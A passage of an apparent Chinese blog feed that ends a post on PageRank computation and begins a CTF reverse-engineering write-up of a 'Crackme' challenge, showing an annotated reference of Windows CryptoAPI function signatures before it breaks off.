250Z"></path></g><g data-mml-node="mi" transform="translate(2115.4,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2635.4,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="msup" transform="translate(3686.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>得到有向图的一般PageRank。</p><script type="math/tex; mode=display">I-dM=\begin{pmatrix}1&0&0&0\\0&1&0&0\\0&0&1&0\\0&0&0&1\end{pmatrix}-\begin{pmatrix}0&\frac25&0&0\\\frac4{15}&0&0&\frac25\\\frac4{15}&0&\frac45&\frac25\\\frac4{15}&\frac25&0&0\end{pmatrix}=\begin{pmatrix}1&-\frac25&0&0\\-\frac4{15}&1&0&-\frac25\\-\frac4{15}&0&\frac15&0\\-\frac4{15}&-\frac25&0&1\end{pmatrix}</script><p>求<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="11.453ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 5062.1 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D43C" d="M43 1Q26 1 26 10Q26 12 29 24Q34 43 39 45Q42 46 54 46H60Q120 46 136 53Q137 53 138 54Q143 56 149 77T198 273Q210 318 216 344Q286 624 286 626Q284 630 284 631Q274 637 213 637H193Q184 643 189 662Q193 677 195 680T209 683H213Q285 681 359 681Q481 681 487 683H497Q504 676 504 672T501 655T494 639Q491 637 471 637Q440 637 407 634Q393 631 388 623Q381 609 337 432Q326 385 315 341Q245 65 245 59Q245 52 255 50T307 46H339Q345 38 345 37T342 19Q338 6 332 0H316Q279 2 179 2Q143 2 113 2T65 2T43 1Z"></path></g><g data-mml-node="mo" transform="translate(1115.2,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(2115.4,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(2635.4,0)"><path data-c="1D440" d="M289 629Q289 635 232 637Q208 637 201 638T194 648Q194 649 196 659Q197 662 198 666T199 671T201 676T203 679T207 681T212 683T220 683T232 684Q238 684 262 684T307 683Q386 683 398 683T414 678Q415 674 451 396L487 117L510 154Q534 190 574 254T662 394Q837 673 839 675Q840 676 842 678T846 681L852 683H948Q965 683 988 683T1017 684Q1051 684 1051 673Q1051 668 1048 656T1045 643Q1041 637 1008 637Q968 636 957 634T939 623Q936 618 867 340T797 59Q797 55 798 54T805 50T822 48T855 46H886Q892 37 892 35Q892 19 885 5Q880 0 869 0Q864 0 828 1T736 2Q675 2 644 2T609 1Q592 1 592 11Q592 13 594 25Q598 41 602 43T625 46Q652 46 685 49Q699 52 704 61Q706 65 742 207T813 490T848 631L654 322Q458 10 453 5Q451 4 449 3Q444 0 433 0Q418 0 415 7Q413 11 374 317L335 624L267 354Q200 88 200 79Q206 46 272 46H282Q288 41 289 37T286 19Q282 3 278 1Q274 0 267 0Q265 0 255 0T221 1T157 2Q127 2 95 1T58 0Q43 0 39 2T35 11Q35 13 38 25T43 40Q45 46 65 46Q135 46 154 86Q158 92 223 354T289 629Z"></path></g><g data-mml-node="msup" transform="translate(3686.4,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(778,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></g></svg></mjx-container>可用矩阵求逆方法初等行变换解得。进而与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.798ex" xmlns="http://www.w3.org/2000/svg" width="5.003ex" height="2.809ex" role="img" focusable="false" viewBox="0 -888.7 2211.4 1241.5"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(500,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(1278,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g></g><g data-mml-node="mi" transform="translate(643.6,-345) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><rect width="1471.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mn" transform="translate(1711.4,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>进行内积运算，得到PageRank值。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;做机器学习的实验做得我生无可恋，还是先补一下机器学习的几个算法的基本原理再说吧。&lt;/p&gt;</summary>
    
    
    
    <category term="基础知识" scheme="http://example.com/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="机器学习" scheme="http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>2022DASCTF Apr X FATE 防疫挑战赛</title>
    <link href="http://example.com/posts/5850d757.html"/>
    <id>http://example.com/posts/5850d757.html</id>
    <published>2022-04-23T03:23:18.924Z</published>
    <updated>2022-04-25T02:52:44.678Z</updated>
    
    <content type="html"><![CDATA[<p>小菜鸡打CTF。</p><span id="more"></span><h1 id="1-Crackme"><a href="#1-Crackme" class="headerlink" title="1. Crackme"></a>1. Crackme</h1><p>无壳，32位EXE程序。运行一下。</p><img src="/posts/5850d757/1.1.png" class="" title="运行结果"><p>载入IDA，定位关键字符串和定位关键函数。先大概分析一下。</p><img src="/posts/5850d757/1.4.png" class="" title="IDA分析"><img src="/posts/5850d757/1.3.png" class="" title="IDA分析"><img src="/posts/5850d757/1.5.png" class="" title="IDA分析"><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取CSP中特定密钥容器的句柄</span></span><br><span class="line">BOOLEAN CRYPTFUNC <span class="title function_">CryptAcquireContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out]HCRYPTPROV* phProv,       <span class="comment">//返回csp句柄</span></span></span><br><span class="line"><span class="params">  [in]LPCTSTR pszContainer,      <span class="comment">//密钥容器名称，用于标识CSP的密钥容器</span></span></span><br><span class="line"><span class="params">  [in]LPCTSTR pszProvider,       <span class="comment">//指向CSP名称的字符串指针，如果为NULL，则使用默认的CSP</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwProvType,          <span class="comment">//CSP类型，用于标识CSP容器支持哪些加密算法（加密解密时的具体算法需要看生成密钥的函数才能确定）</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//标志</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//失败返回0，成功返回非0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取CSP哈希对象句柄，可以使用此句柄来哈希数据和会话密钥</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptCreateHash</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTPROV hProv,          <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]ALG_ID Algid,         　   <span class="comment">//【重要】哈希算法标识(CALG_MD5=0x8003，CALG_SHA_1=0x8004等)</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//如果哈希算法是密钥哈希，如HMACH或者MAC算法，就用此密钥句柄传递密钥，对于非密钥算法，此参数为NULL</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">  [out]HCRYPTHASH* phHash        <span class="comment">//返回创建的哈希对象句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算一段数据的哈希值并加入到指定的哈希句柄中</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptHashData</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hHash,          <span class="comment">//哈希句柄</span></span></span><br><span class="line"><span class="params">  [in]BYTE* pbData,              <span class="comment">//要添加到哈希对象的数据指针</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwDataLen,           <span class="comment">//数据长度</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//标识(所有Microsoft加密服务提供商都忽略此参数)</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从哈希对象中查询指定参数（可以获取CryptHashData哈希结果）</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptGetHashParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HCRYPTHASH hHash,    <span class="comment">//哈希句柄</span></span></span><br><span class="line"><span class="params">  [in]      DWORD dwParam,       <span class="comment">//需要获取参数的类型标识（哈希算法=1，哈希值=2，哈希值长度=4）</span></span></span><br><span class="line"><span class="params">  [out]     BYTE *pbData,        <span class="comment">//缓冲区指针</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD *pdwDataLen,   <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">  [in]      DWORD dwFlags        <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 销毁的哈希对象的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptDestroyHash</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTHASH hHash</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放加密服务提供者(CSP)和密钥容器的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptReleaseContext</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTPROV hProv,</span></span><br><span class="line"><span class="params">  [in] DWORD      dwFlags<span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成从基础数据值派生的加密会话密钥</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptDeriveKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTPROV hProv,          <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]ALG_ID Algid,              <span class="comment">//【重要】用于生成密钥的算法标识(CALG_AES_128=0x660e等)</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hBaseData,      <span class="comment">//用CryptHashData计算数据哈希后，返回的哈希对象句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//生成密钥的类型（是否需要补位、密钥是否可以导出等）</span></span></span><br><span class="line"><span class="params">  [out]HCRYPTKEY* phKey          <span class="comment">//返回新生成密钥的句柄指针</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用随机数生成加密会话密钥或公/私钥对</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptGenKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]   HCRYPTPROV hProv,       <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  [in]   ALG_ID Algid,           <span class="comment">//【重要】指定生成密钥的算法标识(CALG_MD5/CALG_SHA_256等)</span></span></span><br><span class="line"><span class="params">  [in]   DWORD dwFlags,          <span class="comment">//生成密钥的类型（生成会话密钥、密钥是否可以导出等）</span></span></span><br><span class="line"><span class="params">  [out]  HCRYPTKEY *phKey        <span class="comment">//返回创建的密钥句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入加密密钥到csp</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptImportKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  _In_   HCRYPTPROV hProv,       <span class="comment">//csp句柄</span></span></span><br><span class="line"><span class="params">  _In_   BYTE *pbData,           <span class="comment">//密钥缓冲区（由CryptExportKey函数返回）</span></span></span><br><span class="line"><span class="params">  _In_   DWORD dwDataLen,        <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">  _In_   HCRYPTKEY hPubKey,      <span class="comment">//用于解密pbData参数的密钥句柄（如果pbData参数指向的密钥未加密，此参数=0）</span></span></span><br><span class="line"><span class="params">  _In_   DWORD dwFlags,          <span class="comment">//该参数仅在将PRIVATEKEYBLOB形式的公钥/私钥对导入到CSP时才使用</span></span></span><br><span class="line"><span class="params">  _Out_  HCRYPTKEY *phKey        <span class="comment">//返回导入密钥后的句柄</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//失败返回0，成功返回非0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 导出加密密钥到csp</span></span><br><span class="line">BOOL <span class="title function_">CryptExportKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      HCRYPTKEY hKey,          <span class="comment">//要导出的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]      HCRYPTKEY hExpKey,       <span class="comment">//目标用户的密钥句柄，通常为NULL</span></span></span><br><span class="line"><span class="params">  [in]      DWORD     dwBlobType,    <span class="comment">//指定要导出的密钥类型（公钥、私钥等）</span></span></span><br><span class="line"><span class="params">  [in]      DWORD     dwFlags,       <span class="comment">//附加选项，通常为NULL</span></span></span><br><span class="line"><span class="params">  [out]     BYTE      *pbData,       <span class="comment">//接收导出数据的缓冲区，如果为NULL则在pdwDataLen参数中返回需要的长度</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD     *pdwDataLen    <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入公钥Key</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptImportPublicKeyInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]   HCRYPTPROV hCryptProv,              <span class="comment">//CSP句柄</span></span></span><br><span class="line"><span class="params">  [in]   DWORD dwCertEncodingType,           <span class="comment">//指定使用的编码类型</span></span></span><br><span class="line"><span class="params">  [in]   PCERT_PUBLIC_KEY_INFO pInfo,        <span class="comment">//CERT_PUBLIC_KEY_INFO结构的地址,其中包含要导入的公钥和算法</span></span></span><br><span class="line"><span class="params">  [out]  HCRYPTKEY *phKey                    <span class="comment">//用于接收导入公钥的句柄</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置密钥参数</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptSetKeyParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//要设置参数的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwParam,             <span class="comment">//参数类型（例如设置AES_CBC加密算法中的向量IV）</span></span></span><br><span class="line"><span class="params">  [in]BYTE* pbData,              <span class="comment">//参数缓冲区的指针（如果参数类型是向量IV，该缓冲区保存的就是IV值）</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取密钥参数</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptGetKeyParam</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//要查询的密钥句柄</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwParam,             <span class="comment">//参数类型</span></span></span><br><span class="line"><span class="params">  [out]BYTE* pbData,             <span class="comment">//参数缓冲区的指针</span></span></span><br><span class="line"><span class="params">  [in,out]DWORD* pdwDataLen,     <span class="comment">//长度</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags              <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加密数据</span></span><br><span class="line">BOOL WINAPI <span class="title function_">CryptEncrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]     HCRYPTKEY hKey,       <span class="comment">//【重要】加密密钥句柄,密钥指定了使用的加密算法（由CryptGenKey或CryptImportKey函数返回）</span></span></span><br><span class="line"><span class="params">  [in]     HCRYPTHASH hHash,     <span class="comment">//哈希对象句柄（如果要同时对数据进行散列和加密，可以使用该参数，否则NULL）</span></span></span><br><span class="line"><span class="params">  [in]     BOOL Final,           <span class="comment">//指定这是否是正在被加密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwFlags,        <span class="comment">//保留，必须为0</span></span></span><br><span class="line"><span class="params">  [in,out]  BYTE *pbData,        <span class="comment">//明文数据缓冲区，加密后保存密文</span></span></span><br><span class="line"><span class="params">  [in,out]  DWORD *pdwDataLen,   <span class="comment">//pbData缓冲区中明文的长度</span></span></span><br><span class="line"><span class="params">  [in]     DWORD dwBufLen        <span class="comment">//pbData缓冲区的总大小（以字节为单位）（根据算法不同，加密文本可能比原始明文大）</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 解密数据</span></span><br><span class="line">BOOL CRYPTFUNC <span class="title function_">CryptDecrypt</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]HCRYPTKEY hKey,            <span class="comment">//【重要】解密密钥句柄，该密钥指定了要使用的解密算法（由CryptGenKey或CryptImportKey函数返回）</span></span></span><br><span class="line"><span class="params">  [in]HCRYPTHASH hHash,          <span class="comment">//哈希对象句柄，如果不需要散列设置为零</span></span></span><br><span class="line"><span class="params">  [in]BOOL Final,                <span class="comment">//指定这是否是正在被解密数据的最后一节。如果是最后一部分或唯一的一部分，这个值为真;</span></span></span><br><span class="line"><span class="params">  [in]DWORD dwFlags,             <span class="comment">//保留，必须为零</span></span></span><br><span class="line"><span class="params">  [in,out]BYTE* pbData,          <span class="comment">//加密数据缓冲区，解密后保存明文</span></span></span><br><span class="line"><span class="params">  [in,out]DWORD* pdwDataLen      <span class="comment">//缓冲区长度</span></span></span><br><span class="line"><span class="params">)</span>;                               <span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放hKey参数引用的句柄</span></span><br><span class="line">BOOL <span class="title function_">CryptDestroyKey</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HCRYPTKEY hKey</span></span><br><span class="line"><span class="params">)</span>;<span class="comment">//成功返回1，失败返回0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 解码由lpszStructType参数指定的类型数据</span></span><br><span class="line">BOOL <span class="title function_">CryptDecodeObjectEx</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]      DWORD              dwCertEncodingType,    <span class="comment">//使用的编码类型（不重要）</span></span></span><br><span class="line"><span class="params">  [in]      LPCSTR             lpszStructType,        <span class="comment">//【重要】结构体类型常量标识（标识pbEncoded是什么类型的结构体）</span></span></span><br><span class="line"><span class="params">  [in]      <span class="type">const</span> BYTE         *pbEncoded,            <span class="comment">//指向要解码的数据指针（该结构必须是lpszStructType指定的类型）</span></span></span><br><span class="line"><span class="params">  [in]      DWORD              cbEncoded,             <span class="comment">//pbEncoded数据长度</span></span></span><br><span class="line"><span class="params">  [in]      DWORD              